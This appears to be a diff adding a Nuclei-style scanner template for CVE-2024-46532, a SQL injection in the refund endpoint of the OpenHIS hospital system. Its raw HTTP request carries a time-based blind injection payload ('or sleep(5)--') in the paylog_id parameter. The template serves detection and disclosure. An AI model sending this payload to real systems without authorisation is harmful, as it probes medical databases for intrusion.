@@ -1,0 +1,22 @@
+id: openhis-medical-system-sql
+
+info:
+  name: "OpenHIS PayController.class.php SQL注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    OpenHIS系统PayController.class.php组件中存在SQL注入漏洞，具体出现在退款功能处理逻辑。该缺陷源于对用户输入参数缺乏有效的安全过滤机制，攻击者可通过构造恶意请求执行任意SQL代码。
+
+    该漏洞影响版本未明确标注，但根据漏洞披露时间推断可能存在于特定部署环境中。攻击者可利用此漏洞获取数据库敏感信息或实施进一步攻击。
+
+  reference:
+  - CVE-2024-46532
+  tags: OpenHIS
+
+http:
+- raw:
+  - |-
+    GET /index.php/pay/refund?paylog_id=aaaa'+or+sleep(5)+-- HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Connection: close
